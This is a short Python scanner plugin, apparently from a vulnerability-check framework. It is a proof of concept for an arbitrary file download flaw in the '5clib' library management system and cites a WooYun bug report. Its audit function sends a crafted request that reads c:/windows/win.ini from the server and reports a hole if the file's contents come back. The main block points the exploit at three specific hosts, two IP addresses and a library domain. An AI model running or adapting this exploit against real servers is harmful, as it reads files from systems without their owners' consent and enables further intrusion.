#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name: 五车图书管系统任意下载
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0128591
#Author:xq17
def assign(service, arg):
    if service == "5clib":
        return True, arg

def audit(arg):
    payload = arg + "5clib/kinweblistaction.action?actionName=down&filePath=c:/windows/win.ini"
    code, head, res, errcode, _ = curl.curl2(payload)
    if code ==200 and 'support' in res and 'MPEGVideo' in res:
        security_hole(payload+':Any reading ' )


if __name__ == '__main__':
    from dummy import *
    audit(assign('5clib','http://222.208.6.176:8081/')[1])
    audit(assign('5clib','http://117.146.103.163:8081/')[1])
    audit(assign('5clib','http://lyqk.xjlib.org:8081/')[1])